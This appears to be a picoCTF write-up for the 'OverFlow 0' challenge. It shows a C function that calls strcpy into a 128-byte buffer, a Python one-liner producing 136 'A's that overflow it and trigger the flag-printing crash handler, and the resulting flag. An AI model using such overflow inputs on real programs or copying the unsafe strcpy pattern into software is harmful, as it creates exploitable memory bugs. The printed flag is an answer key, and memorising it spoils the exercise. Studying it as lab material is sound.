# OverFlow 0 - Points: 100
<b>Description : </b>This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a on the shell server. Source.<br>
<b>Hints : </b>Find a way to trigger the flag to print. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
# Solved
Vulnerability located at :
```cpp
void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}
```
That function give us 128 bytes to Bufferoverflow to read flag content, we can see at here
```cpp
#define FLAGSIZE_MAX 64
char flag[FLAGSIZE_MAX];

// ...
fgets(flag,FLAGSIZE_MAX,f);
signal(SIGSEGV, sigsegv_handler);
```
That code bring us to read file of flag.txt without getting <b>Segmentation fault</b>. This is command that i use
```python
# 128 + 8 (Pointer)
(python -c 'print "A" * 136')
```
Copy the result into argument
```
./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Flag : <b>picoCTF{3asY_P3a5y0a131490}</b>
